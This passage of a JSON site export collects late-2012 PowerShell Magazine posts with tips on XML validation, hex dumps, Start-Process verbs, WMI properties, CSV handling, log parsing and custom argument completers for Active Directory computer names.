notice that you get the same output over and over again.\nI’m not sure why it happens (and I reported this as a bug) but Update-Help reports any on-line help file that matches the ones on your local system.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/20/improving-the-output-of-update-help/","tags":["How To"],"title":"Improving the output of Update-Help"},{"categories":["Tips and Tricks"],"contents":"We often deal with XML files whether it is modifying TFS work item templates, C# project files, or our own XML data files. When making quick changes to an XML file in a simple editor like Notepad, it is prudent to check the updated XML file before checking it back in or deploying it. The PowerShell Community Extensions (1.2 and higher) provides a command to do just that called Test-Xml. Using Test-Xml is quite simple:\nPS\u0026gt; '\u0026lt;doc\u0026gt;\u0026lt;book/\u0026gt;\u0026lt;book\u0026gt;\u0026lt;/doc\u0026gt;' | Test-Xml WARNING: The 'book' start tag on line 1 position 14 does not match the end tag of 'doc'. Line 1, position 21. False C:\\PS\u0026gt; ${c:data.xml} | Format-Xml -AttributesOnNewLine \u0026gt; data.xml\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt; \u0026lt;Configuration\u0026gt; \u0026lt;/Configuration\u0026gt; The above file is well formed e.g.:\nPS\u0026gt; Test-Xml .\\web.config True  However that doesn’t mean everything is right with this file. Upon validating using a schema file provided by Visual Studio we can see that there is a problem:\nPS\u0026gt; Test-Xml .\\web.config -Validate -SchemaPath 'C:\\Program Files (x86)\\Microsoft Visual Studio 11.0\\Xml\\Schemas\\1033\\DotNetConfig.xsd' –Verbose VERBOSE: Error: The 'Configuration' element is not declared. Line 2, Position 2. False  As it turns out, XML element names are case-sensitive and the configuration element should have been specified like so:\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;/configuration\u0026gt; With that slight change, we have both a well-formed and schema validated XML file e.g.:\nPS\u0026gt; Test-Xml .\\web.config -Validate -SchemaPath 'C:\\Program Files (x86)\\Microsoft Visual Studio 11.0\\Xml\\Schemas\\1033\\DotNetConfig.xsd' True  Note: There are many more useful PowerShell Community Extensions (PSCX) commands. If you are interested in this great community project led by PowerShell MVPs Keith Hill and Oisin Grehan, give PSCX a try at http://pscx.codeplex.com.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/19/pscxtip-testing-xml-for-well-formedness-and-validity-against-a-schema/","tags":["Tips and Tricks"],"title":"#PSCXTip Testing XML for well-formedness and validity against a schema"},{"categories":["Tips and Tricks"],"contents":"XML is great for easily storing structured data and is pretty easy to work with in PowerShell. However, sometimes you run across XML that is so poorly formatted you lose out on XML’s human readability. Here’s a simple example – the entire set of XML on a single line:\n\u0026lt;AFX_RIBBON attribute1=\"foo\" attribute2=\"bar\"\u0026gt;\u0026lt;HEADER\u0026gt;\u0026lt;VERSION\u0026gt;1\u0026lt;/VERSION\u0026gt;\u0026lt;/HEADER\u0026gt;\u0026lt;RIBBON_BAR\u0026gt;\u0026lt;ELEMENT_NAME\u0026gt;RibbonBar\u0026lt;/ELEMENT_NAME\u0026gt;\u0026lt;/RIBBON_BAR\u0026gt;\u0026lt;/AFX_RIBBON\u0026gt;  The space for the column is short so I’ve shown an example that isn’t too abusive. I’ve run across single line XML files that were thousands of characters wide. When you run into these situations, you’d really like a tool for pretty-print the XML for you. The PowerShell Community Extensions (1.2 or higher) comes with such a command – Format-Xml. Here’s an example of its usage based on the XML shown above:\nPS\u0026gt; Format-Xml -InputObject $xml \u0026lt;AFX_RIBBON attribute1=\u0026quot;foo\u0026quot; attribute2=\u0026quot;bar\u0026quot;\u0026gt; \u0026lt;HEADER\u0026gt; \u0026lt;VERSION\u0026gt;1\u0026lt;/VERSION\u0026gt; \u0026lt;/HEADER\u0026gt; \u0026lt;RIBBON_BAR\u0026gt; \u0026lt;ELEMENT_NAME\u0026gt;RibbonBar\u0026lt;/ELEMENT_NAME\u0026gt; \u0026lt;/RIBBON_BAR\u0026gt; \u0026lt;/AFX_RIBBON\u0026gt; Format-Xml has a few useful options like allowing you to specify that attributes should appear on new lines e.g.:\nPS\u0026gt; Format-Xml -InputObject $xml –AttributesOnNewLine \u0026lt;AFX_RIBBON attribute1=\u0026quot;foo\u0026quot; attribute2=\u0026quot;bar\u0026quot;\u0026gt; \u0026lt;HEADER\u0026gt; \u0026lt;VERSION\u0026gt;1\u0026lt;/VERSION\u0026gt; \u0026lt;/HEADER\u0026gt; \u0026lt;RIBBON_BAR\u0026gt; \u0026lt;ELEMENT_NAME\u0026gt;RibbonBar\u0026lt;/ELEMENT_NAME\u0026gt; \u0026lt;/RIBBON_BAR\u0026gt; \u0026lt;/AFX_RIBBON\u0026gt; There are also options for configuring the IndentString, setting the XML conformance level and omitting the XML declaration. Keep in mind you can load an XML, reformat it using Format-Xml and save it back out e.g.:\nC:\\PS\u0026gt; ${c:data.xml} | Format-Xml -AttributesOnNewLine \u0026gt; data.xml\nThe above trick requires that data.xml be in the current directory. Still it is a handy way to read \u0026amp; write the same file in a one-liner.\nNote: There are many more useful PowerShell Community Extensions (PSCX) commands. If you are interested in this great community project led by PowerShell MVPs Keith Hill and Oisin Grehan, give PSCX a try at http://pscx.codeplex.com.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/18/pscxtip-formatting-xml-for-better-readability/","tags":["Tips and Tricks"],"title":"#PSCXTip Formatting XML for better readability"},{"categories":["Tips and Tricks"],"contents":"Text files created by PowerShell are little endian Unicode (UTF-16LE) by default. You can see this by inspecting the first couple of bytes of a text file for a BOM i.e. a byte order mark. BOMs are not required but PowerShell usually create a BOM when it creates a text file. Typical BOMs you’ll encounter with Windows and PowerShell are:\nUTF-8 : 0xEF 0xBB 0xBF UTF-16LE : 0xFF 0xFE  You can’t use code like [System.IO.File]::ReadAllText() to view a BOM because the bytes associated with the BOM aren’t output – just the associated text is output. Get-Content works the same way except when you use the –Encoding Byte parameter. Given a file created in PowerShell:\nPS\u0026gt; Get-Date \u0026gt; date.txt  You can see the encoding using Get-Content like so:\nPS\u0026gt; Get-Content .\\date.txt –Encoding Byte –TotalCount 3 255 254 13  However, unless you’re quick with your decimal to hex conversions, this output isn’t ideal. The PowerShell Community Extensions comes with a command called Format-Hex that will format its input or a specified file in hex format. This utility is much like the od command from UNIX. The output from the Format-Hex command for the same file as above would be:\nPS\u0026gt; Format-Hex .\\date.txt -Count 16 Address: 0 1 2 3 4 5 6 7 8 9 A B C D E F ASCII -------- ----------------------------------------------- ---------------- 00000000 FF FE 0D 00 0A 00 53 00 75 00 6E 00 64 00 61 00 ......S.u.n.d.a. Here we can see the first two bytes are 0x_FF 0xFE_, which is _UTF-16LE_ or little endian Unicode. If we saved the date.txt as _UTF-8_:\nPS\u0026gt; Get-Date | Out-File date.txt -Encoding Utf8 PS\u0026gt; Format-Hex .\\date.txt -Count 16 Address: 0 1 2 3 4 5 6 7 8 9 A B C D E F ASCII -------- ----------------------------------------------- ---------------- 00000000 EF BB BF 0D 0A 53 75 6E 64 61 79 2C 20 44 65 63 .....Sunday, Dec Here we can see the UTF-8 BOM 0xEF 0xBB 0xBF. This tip is most useful when you’re processing a file created by another program with PowerShell and you need to make sure you leave the file in the same encoding that it started out with.\nNote: There are many more useful PowerShell Community Extensions (PSCX) commands. If you are interested in this great community project led by PowerShell MVPs Keith Hill and Oisin Grehan, give PSCX a try at http://pscx.codeplex.com.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/17/pscxtip-how-to-determine-the-byte-order-mark-of-a-text-file/","tags":["Tips and Tricks"],"title":"#PSCXTip How to determine the byte order mark of a text file"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn an earlier tip, we saw how we can get the supported verbs for a given file type to use with Start-Process cmdlet. In this tip, I will show you how to use these verbs in an interesting and useful way.\nPS\u0026gt; Start-Process -FilePath \"C:\\Documents\\Test.Docx\" -Verb Print  Isn’t this simple? With a simple one-liner, we can print a Word document to the default print device.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/13/pstip-print-a-word-document-using-start-process-cmdlet/","tags":["Tips and Tricks"],"title":"#PSTip Print a Word document using the Start-Process cmdlet"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nWe know that Start-Process cmdlet can be used to start a new process. This cmdlet has a parameter called –Verb that specifies what action to perform while creating the new process. The value of the parameter depends on the file type of the process being created. Let us see an example first:\nPS\u0026gt; Start-Process notepad.exe -Verb RunAs  The above code starts notepad.exe process as administrator. But, how do we know what all verbs are supported for a given file type?\nSimple! We can use System.Diagnostics.ProcessStartInfo class for that.\nPS\u0026gt; $processInfo = New-Object System.Diagnostics.ProcessStartInfo -ArgumentList \"test.exe\" PS\u0026gt; $processInfo.Verbs open runas runasuser  As you see in the above command, we can use the New-Object cmdlet to initialize the ProcessStartInfo class constructor with a specific file type. The value of -ArgumentList parameter is just a dummy file name and it doesn’t need to exist.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/12/pstip-explore-values-that-can-be-used-with-start-processs-verb-parameter/","tags":["Tips and Tricks"],"title":"#PSTip Explore values that can be used with Start-Process’s -Verb parameter"},{"categories":["Tips and Tricks"],"contents":"You have a collection of values in a variable. When you pipe the variable to the Get-Member cmdlet you get the type and members of each item in that collection. PowerShell unrolls the collection and sends each item through the pipeline, one at a time, to the Get-Member cmdlet.\nPS\u0026gt; $array = \u0026quot;one\u0026quot;,2 PS\u0026gt; $array | Get-Member TypeName: System.String Name MemberType Definition ---- ---------- ---------- Clone Method System.Object Clone(), System.Object ... CompareTo Method int CompareTo(System.Object value), i... (...) TypeName: System.Int32 Name MemberType Definition ---- ---------- ---------- CompareTo Method int CompareTo(System.Object value), int CompareTo... Equals Method bool Equals(System.Object obj), bool Equals(int o... (...) Most of the time that’s the desired output. However, there are cases where you’ll need to get the members of the collection itself. To do so, you can choose one of three approaches. Call the GetType method on a variable:\nPS\u0026gt; $array.GetType() IsPublic IsSerial Name BaseType -------- -------- ---- -------- True True Object[] System.Array Pass the collection object to the InputObject parameter of the Get-Member cmdlet:\nPS\u0026gt; Get-Member -InputObject $array TypeName: System.Object[] Name MemberType Definition ---- ---------- ---------- Count AliasProperty Count = Length Add Method int IList.Add(System.Object value) Address Method System.Object\u0026amp;, mscorlib, Version=4.0.0... Clear Method void IList.Clear() Clone Method System.Object Clone(), System.Object IC... CompareTo Method int IStructuralComparable.CompareTo(Sys... (...) Or use the unary comma operator to create an array with one member. That way when the array is unrolled the inner array will pass through the pipeline as one item.\nPS\u0026gt; ,$array | Get-Member   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/11/pstip-getting-information-about-a-collection-object-not-its-elements/","tags":["Tips and Tricks"],"title":"#PSTip Getting information about a collection object, not its elements"},{"categories":["Tips and Tricks"],"contents":"Whenever you use Windows Management Instrumentation (WMI), the result always comes back with a list of system properties. WMI system properties are associated with all classes and instances of classes, and begin with a double underscore.\nPS\u0026gt; Get-WmiObject Win32_Processor __GENUS : 2 __CLASS : Win32_Processor __SUPERCLASS : CIM_Processor __DYNASTY : CIM_ManagedSystemElement __RELPATH : Win32_Processor.DeviceID=\u0026quot;CPU0\u0026quot; __PROPERTY_COUNT : 48 __DERIVATION : {CIM_Processor, CIM_LogicalDevice, CIM_LogicalElement, CIM_ManagedSystemElement} __SERVER : LOKI __NAMESPACE : root\\cimv2 __PATH : \\\\LOKI\\root\\cimv2:Win32_Processor.DeviceID=\u0026quot;CPU0\u0026quot; AddressWidth : 64 Architecture : 9 Availability : 3 Caption : Intel64 Family 6 Model 44 Stepping 2 ConfigManagerErrorCode : ConfigManagerUserConfig : CpuStatus : 1 CreationClassName : Win32_Processor CurrentClockSpeed : 2800 CurrentVoltage : 33 DataWidth : 64 Description : Intel64 Family 6 Model 44 Stepping 2 (...) Sometimes you’d want to remove system properties from the output, when constructing a report for example, and you might attempt to do that with the ExcludeProperty parameter of the Select-Object cmdlet, but as you can see it doesn’t seem to work, all system properties are still in place.\nPS\u0026gt; Get-WmiObject Win32_Processor | Select-Object -ExcludeProperty __* __GENUS : 2 __CLASS : Win32_Processor __SUPERCLASS : CIM_Processor __DYNASTY : CIM_ManagedSystemElement __RELPATH : Win32_Processor.DeviceID=\u0026quot;CPU0\u0026quot; __PROPERTY_COUNT : 48 __DERIVATION : {CIM_Processor, CIM_LogicalDevice, CIM_LogicalElement, CIM_ManagedSystemElement} __SERVER : LOKI __NAMESPACE : root\\cimv2 __PATH : \\\\LOKI\\root\\cimv2:Win32_Processor.DeviceID=\u0026quot;CPU0\u0026quot; AddressWidth : 64 Architecture : 9 (...) In order to exclude them you must first include all properties. The ExcludeProperty parameter is effective only when the command also includes the Property parameter.\nPS\u0026gt; Get-WmiObject Win32_Processor | Select-Object -Property * -ExcludeProperty __* AddressWidth : 64 Architecture : 9 Availability : 3 Caption : Intel64 Family 6 Model 44 Stepping 2 ConfigManagerErrorCode : ConfigManagerUserConfig : CpuStatus : 1 CreationClassName : Win32_Processor CurrentClockSpeed : 2800 CurrentVoltage : 33 DataWidth : 64 Description : Intel64 Family 6 Model 44 Stepping 2 (...) ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/09/pstip-excluding-wmi-system-properties/","tags":["Tips and Tricks"],"title":"#PSTip Excluding WMI system properties"},{"categories":["Brainteaser"],"contents":"This is the command I had initially in mind when writing the last modified time teaser:\nls $pshome\\powershell.exe|date  I also had this one, which is shorter:\nps -id $pid|gi|date  But I specifically asked for powershell.exe and the above might report the last modified time of hosts other than powershell.exe (e.g ISE). Some of the answers also used wildcards for the file name. It certainly shortens the command but may introduce false results if similar files were added to the PowerShell folder.\nAnyway, the trick to make it work without having to refer to the LastWriteTime property is to pipe a file system object to the Get-Date cmdlet. Why does that work?\nThe Date parameter of the Get-Date cmdlet accepts pipeline input by property name (the parameter attribute ValueFromPipelineByPropertyName is set to $true). The Date parameter also defines a LastWriteTime alias. This means that the value of incoming objects that have a Date property (or a LastWriteTime property), is assigned to the Date parameter.\nPS\u0026gt; (Get-Command Get-Date).Parameters.Date Name : Date ParameterType : System.DateTime ParameterSets : {[__AllParameterSets, System.Management.Automation.ParameterSetMetadata]} IsDynamic : False Aliases : {LastWriteTime} Attributes : {__AllParameterSets, System.Management.Automation.AliasAttribute} SwitchParameter : False And why date and not Get-Date? When PowerShell search for a command, if the command was not found it tries to prepend it with the default Get verb.\nSo, if PowerShell can’t find a command named ‘date’, it will try a second time with Get-Date.\nYou can see this in action if you execute any Get command without the verb. For instance, service vs. Get-Service, and so on.\nThat’s it. I hope you liked the challenge, I know I did!\nThis time the winner is Jakub Jareš. Jakub, I hope you had a good night sleep the other day, you nailed it! Head on to Jakub’s blog, he wrapped up his work on the teaser on his blog: http://powershell.cz/2012/12/07/last-modified-date-brainteaser\nSorry we don’t have any giveaways this time but you’ve got our respect 🙂\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/08/brain-teaser-one-way-to-solve-it/","tags":["Brainteaser"],"title":"Brain teaser – one way to solve it"},{"categories":["Tips and Tricks"],"contents":"Going through folders, you sometimes find yourself in some strangely named ones you are sure you’ll have to revisit again. To avoid searching for the folders after some digging around, use the pushd (Push-Location) command to save your current location to stack.\nPS C:\\Windows\\System32\\DriverStore\\FileRepository\\brmfcmdm.inf_x86_neutral_3b38c2e8e6f06c1b\u0026gt; pushd  Or to save the location and go one folder up in the folder structure do:\nPS C:\\Windows\\System32\\DriverStore\\FileRepository\\brmfcmdm.inf_x86_neutral_3b38c2e8e6f06c1b\u0026gt; pushd ..  Now you can dig around how you want. For example go check the driver setup logs in the inf folder. After you are finished, use popd (Pop-Location) to go back to where you were.\nPS C:\\windows\\inf\u0026gt; popd PS C:\\Windows\\System32\\DriverStore\\FileRepository\\brmfcmdm.inf_x86_neutral_3b38c2e8e6f06c1b\u0026gt;   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/06/pstip-use-push-location-to-save-your-current-location/","tags":["Tips and Tricks"],"title":"#PSTip Use Push-Location to save your current location"},{"categories":["How To"],"contents":"In a recent task I had to handle quite a massive amount of log files from a load test program and I wanted to get the amount of log records and also the time from the first to the last record. With this data I could calculate the average per second of the jobs that was processed. Doing this manually would have taken forever. For each log file there were about 20 records. Each process created its own log file and we had 625 processes on each server.\nThe test aimed on looking at the difference between running this program on one virtual server with 1,2,3,4,5,6,7, and 8 CPUs and then two virtual servers with 8 CPUs and then four servers with 4 CPUs and last four servers with 8 CPUs. The program was created to load the CPU with calculations and see how the OS would handle that load, and also the goal was to test the single physical machine that was hosting these virtual machines. The physical server hardware had 2 CPUs with 8 cores and HT enabled; that was why we aimed at maxing out all 16 cores and 32 logical CPUs.\nThe log files was updated with a record after 1 x 109 computations and I then counted number of records and when each process had started and also the time of the last record of each process. This was used to get the average number of computations per second overall processes.\nThe folders containing the log files with a single server did not have subfolders and the ones with up to four servers had subfolders, that is why I am using the –File and –Recurse on my Get-ChildItem cmdlet to get the log files.\nAs you can see I had some test folders to traverse and also some log files.\nAnd here is an extract from one of the log files:\nHere is my reporting script:\n##################################### # Handle log files and get average iterations per second # # Niklas Åkerlund 2012-10-30 ##################################### $folders = Get-ChildItem C:\\testlog\\test -Directory $TotalReport = @() foreach ($folder in $folders){ $filelist = (Get-ChildItem $folder.FullName -Recurse -File).FullName $allvalues = @() $startReport = @() foreach ($file in $filelist){ $filecontent = Get-Content $file $Count = $filecontent.Count for ($i=4;$i -le ($Count -1);$i++){ $line = $filecontent[$i] $array = $line.Split(\u0026quot; \u0026quot;) $seconds = [double]$array[4].Replace(\u0026quot;,\u0026quot;,\u0026quot;.\u0026quot;) $iterSeconds = [double]$array[10].Replace(\u0026quot;,\u0026quot;,\u0026quot;.\u0026quot;) $logObj = [pscustomobject]@{ Seconds= $seconds Iterations=$array[6] IterSeconds=$iterSeconds } $allvalues +=$logObj } # Get all logtimes $reportObj = [pscustomobject]@{ Test=($folder.Name).Split(\u0026quot;_\u0026quot;)[2] Process = [int](($file.Split(\u0026quot;\\\u0026quot;)[-1]).Split(\u0026quot;_\u0026quot;)[2]).Split(\u0026quot;.\u0026quot;)[0] Start= ($filecontent[3]).Split(\u0026quot; \u0026quot;)[0] + \u0026quot; \u0026quot; + ($filecontent[3]).Split(\u0026quot; \u0026quot;)[1] LastRun=($filecontent[($Count-1)]).Split(\u0026quot; \u0026quot;)[1] + \u0026quot; \u0026quot; + ($filecontent[($Count-1)]).Split(\u0026quot; \u0026quot;)[2] TotalRunPerFile= $Count -5 } $startReport +=$reportObj } # Count the average iterations for all processes on the given time $FirstStart = $StartReport | Sort-Object Start | Select-Object -First 1 Start $LastFinish = $StartReport | Sort-Object LastRun | Select-Object -Last 1 LastRun $totalRunnings = ($StartReport.TotalRunPerFile | Measure-Object -Sum).Sum $totalsec = ((get-date $LastFinish.LastRun) - (get-date $FirstStart.Start)).TotalSeconds $avg = ($totalRunnings*1000000000)/$totalsec $TotSec = $allvalues.Seconds | Measure-Object -Sum $AllDataObj = [pscustomobject]@{ Name = ($folder.Name).Split(\u0026quot;_\u0026quot;)[2] TotSecProgram=$TotSec.Sum TotalSec=$totalsec #MinSec=$avgSec.Minimum AvgIterTotSec=$avg first=$FirstStart.Start last=$LastFinish.LastRun duration=((get-date $LastFinish.LastRun) - (get-date $FirstStart.Start)).TotalHours Iterations=$totalRunnings AllValues=$allvalues } $TotalReport += $AllDataObj } $TotalReport  I used the data from this to export it to a CSV file and then open it in Excel to create a graph from the Name and the AvgIterTotSec.\nPS\u0026gt; $logdata = .\\logmassage2.ps1 PS\u0026gt; $logdata | Select-Object Name,AvgIterTotSec,duration,NumRuns | Export-Csv -Path C:\\testlog\\logdata.csv -UseCulture -NoTypeInformation  The conclusion on this test is that with this load testing software aimed at maxing out the CPUs we did not get any performance benefit of using more logical CPUs than there was physical cores on the hardware, rather a decrease of performance as the graph is showing.\nThe first 8 pillars shows the values from a single virtual server and the 4 last pillars show the results for several virtual servers. What I am trying to show with the glowing pillar is, that test has the highest result and the configuration was two virtual servers with 8 CPUs each, the test after that with three virtual servers with 8 CPUs each and one virtual server with 7 CPUs and this shows that with over allocating the physical cores gives a result that is performing worse. The reason for leaving one CPU for the virtual host was because of old best practices guidelines and we wanted to show that this has no effect on the result and so to say bust that myth.\nAs you can see in my script I am using the Measure-Object and also the PowerShell 3.0 ability to get a value from an array directly without using a foreach or for loop. Maybe not the most perfect script written but it got the job done and that is what I love with PowerShell and its ability to easily get the results wanted and that without too much pain .\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/06/handle-log-files-with-powershell-3-0/","tags":["How To"],"title":"Handle log files with PowerShell 3.0"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 1.0 or above.\nIn an earlier tip, we showed you how to create a file of the specified size. In today’s post, let us see how we can use another .NET class – System.IO.Path – to create a temporary, zero-byte file on the disk.\nPS\u0026gt; [System.IO.Path]::GetTempFileName() C:\\Users\\ravi\\AppData\\Local\\Temp\\tmp2D48.tmp  The GetTempFileName() method can be quite useful when you need to generate a random temporary file for writing log information from a script or for saving state of your script while the execution is in progress. As shown above, this method returns full path of the newly created temporary file and always creates temporary files with an extension .TMP.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/04/pstip-generate-a-zero-byte-temporary-file-on-disk/","tags":["Tips and Tricks"],"title":"#PSTip Generate a zero-byte, temporary file on disk"},{"categories":["How To"],"contents":"Working with CSV files in PowerShell is a common practice. You import the file, loop on its records and you’re good to go. Sometimes however you may find yourself in a situation where you get a file that has blank lines in it, and those lines can break your script. Consider the following CSV content:\n## sample.csv ## column1,column2,column3 Value1,Value2,Value3 Value1,Value2,Value3 \u0026lt;empty line\u0026gt; \u0026lt;empty line\u0026gt; \u0026lt;empty line\u0026gt; ## file ends here  On the surface, nothing looks suspicious when you import the file:\nPS\u0026gt; Import-Csv sample.csv column1 column2 column3 ------- ------- ------- Value1 Value2 Value3 Value1 Value2 Value3 PS\u0026gt; But if you pipe it to Format-List you can clearly see what’s going on. You get empty objects for each empty line in the file.\nPS\u0026gt; Import-Csv sample.csv | Format-List column1 : Value1 column2 : Value2 column3 : Value3 column1 : Value1 column2 : Value2 column3 : Value3 column1 : column2 : column3 : column1 : column2 : column3 : column1 : column2 : column3 : To filter out empty objects you need to test that all properties are not equal to an empty string and throw them away.\nYou might be attempted to do that with:\nImport-Csv sample.csv | Where-Object {$_.column1 -ne '' -and $_.column1 -ne '' -and $_.column1 -ne ''}  But what if each record has 20 properties, or even more? This is where the PSObject property comes to rescue. In a nutshell, PSObject allows us to work with any object in the same way without really knowing its structure. PowerShell wraps the base object in a PSObject and provide us a simplified and consistent view of the object, its methods, properties, and so on. One of the properties of PSObject is Properties, and it gives us a list of properties of the base object.\nOn a related note, PSObject and other members are not visible when you pipe an object to the Get-Member cmdlet. To reveal those members add the -Force switch to Get-Member.\nFor our purpose, we can process the properties list and filter out those who have a Value of null.\nImport-Csv sample.csv | Where-Object { ($_.PSObject.Properties | ForEach-Object {$_.Value}) -ne $null} | Format-List column1 : Value1 column2 : Value2 column3 : Value3 column1 : Value1 column2 : Value2 column3 : Value3 In PowerShell 3.0 and the new Member Enumeration feature we can get the same result in less characters:\nImport-Csv sample.csv | Where-Object { $_.PSObject.Properties.Value -ne $null}  I logged an Import-Csv feature enhancement, and you can add your vote if you’d like to have a built-in option of ignoring empty lines.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/04/skipping-empty-csv-objects/","tags":["How To"],"title":"Skipping empty CSV objects"},{"categories":["Brainteaser"],"contents":"Before we dive into this week’s teaser we would like to announce the winner of last week’s challenge. Ioan Corcodel, congratulations! You take with you a copy of Microsoft Windows PowerShell 3.0 First Look written by Adam Driscoll. Once again, we would like to thank our sponsor Packt, one of the most prolific and fast-growing tech book publishers in the world, for providing such a cool prize.\nIoan, your solution worked great and it was 78 characters long. By the way, I was able to shave off a few more characters 🙂 ,75 vs. 78 :\necho Hannah Jeffrey ‘12321’ Madam Abracadabra|?{-join$_[$_.Length..0]-eq$_}\nAs for this week’s teaser, your task is to get the last modified date and time of a file system object, without referring to the LastWriteTime property.\nFor this example, you need to emit the LastWriteTime value of powershell.exe as a System.DateTime object.\nOne thing though, there’s no prize this week. I know you guys are here for the challenge and the prize is only an excuse to participate and share your knowledge. 🙂\nAgain, comments are allowed until Friday and we will announce the winner on Monday, next week.\nPlease use the comment box at the bottom of this page to submit your solution. Don’t have a solution of your own, or it has been already posted by others? You can still participate and add your voice by voting on a existing comments, use the up/down voting arrows.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/04/get-the-last-modified-date-and-time/","tags":["Brainteaser"],"title":"Get the last modified date and time"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nSome applications or scripts might require the presence of a specific time zone on the system to be able to execute the actions defined by the application. For example, your script might have to adjust to the date/time format used in the script or consider daylight savings to ensure the script or application task scheduling is accurate. This is just one example of a time zone-aware application.\nFor the time zone-awareness, we need to be able to identify what time zones are available. We can do this using the TimeZoneInfo .NET class.\nPS\u0026gt; [TimeZoneInfo]::GetSystemTimeZones() | select Id, DisplayName  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/03/pstip-enumerating-available-time-zones/","tags":["Tips and Tricks"],"title":"#PSTip Enumerating available time zones"},{"categories":["News"],"contents":"PowerShell Magazine – since it’s inception – has certainly been growing in popularity and readership. We moved from 100 posts to 230+ in no time. We could not make it without a great support from PowerShell community.\nShared hosting was not a viable option anymore to handle the increasing load. Also, we faced quite a few issues with our web host which effected the overall reader experience. We needed a better hosting solution that can accommodate the growth.\nSo, here we are. We made a new investment in acquiring a Virtual Private Server (VPS) configured to handle the growth for next couple of years – at least. We are confident that this investment improved the performance of our site and improves the reader experience.\nAlong with this, we have also introduced a few changes to our mobile theme. You will see a much better layout and support for increased number of mobile devices.\nOverall, the editors would like to thank all our readers for being with us and supporting us in this process. You will continue to see increased PowerShell goodness from us.\nWe invite you to be a part of our journey. Write to us if you have any feedback or just want to share your PowerShell Magazine experience.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/30/powershell-magazine-has-a-new-home/","tags":["News"],"title":"PowerShell Magazine has a new home!"},{"categories":["tabexpansion2","Module Spotlight"],"contents":"Custom argument completers is a new feature in PowerShell 3.0 which makes it possible to define your own argument values for parameters. Let us use Set-ExecutionPolicy as an example.\nDue to the new IntelliSense feature in Windows PowerShell Integrated Scripting Environment (ISE) 3.0, we get a list of available parameters when we type the name of a cmdlet, press space and type a dash:\nAs you might have noticed, this also works for the parameter values on cmdlets where the cmdlet author has implemented this feature:\nPowerShell MVP Tobias Weltner has written an excellent article describing how you can define custom parameter arguments using the new custom argument completer functionality in PowerShell 3.0.\nAs an example, wouldn’t it be nice if you could get a list of all computers from Active Directory when you hit space after the –ComputerName parameter on any cmdlet or function which uses this parameter?\nThis is fully possible using a custom argument completer. First, let’s retrieve a string array of all computers from Active Directory. Because we do not want to be dependent on any modules or snap-ins like Microsoft’s ActiveDirectory module or Quest’s PowerShell Commands for Active Directory, we use ADSI to retrieve the data:\n$searcher = [adsisearcher]\"(\u0026(objectClass=Computer)(operatingSystem=Windows Server*))\" $searcher.PropertiesToLoad.Add(\"cn\") | Out-Null $searcher.PropertiesToLoad.Add(\"operatingsystem\") | Out-Null $searcher.FindAll()  The above example will retrieve all computer accounts from the Active Directory domain your computer is a member of, where the attribute “operatingSystem” begins with the word “Windows Server”.\nNext, we add the code that retrieves the data we want to use into a custom completion handler:\n$Completion_ComputerName = { param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameter) $searcher = [adsisearcher]\u0026quot;(\u0026amp;(objectClass=Computer)(operatingSystem=Windows Server*))\u0026quot; $searcher.PropertiesToLoad.Add(\u0026quot;cn\u0026quot;) | Out-Null $searcher.PropertiesToLoad.Add(\u0026quot;operatingsystem\u0026quot;) | Out-Null $searcher.FindAll() | ForEach-Object { New-Object -TypeName pscustomobject -Property @{ ComputerName = ($_.properties)[\u0026quot;cn\u0026quot;].Item(0) OperatingSystem = ($_.properties)[\u0026quot;operatingsystem\u0026quot;].Item(0) } } | Sort-Object ComputerName | ForEach-Object { New-Object System.Management.Automation.CompletionResult $_.ComputerName, $_.ComputerName, 'ParameterValue', ('{0} ({1})' -f $_.ComputerName, $_.OperatingSystem) } }  At last we need to add the handler into built-in tabexpansion2 function:\nif (-not $global:options) { $global:options = @{CustomArgumentCompleters = @{};NativeArgumentCompleters = @{}} } $global:options['CustomArgumentCompleters']['ComputerName'] = $Completion_ComputerName $function:tabexpansion2 = $function:tabexpansion2 -replace 'End\\r\\n{','End { if ($null -ne $options) { $options += $global:options} else {$options = $global:options} Now we can test if our custom completer works by using any cmdlet with a –ComputerName parameter, for example Get-Service:\nHere we can see IntelliSense providing computer names from Active Directory. Also note that the operating system is listed in parenthesis. Instead of retrieving the values from Active Directory you could also get them from a text file, CSV-file, SQL database, or any other data store you can access from PowerShell.\nAs you can see, the new custom argument completion feature opens up for a lot of interesting use 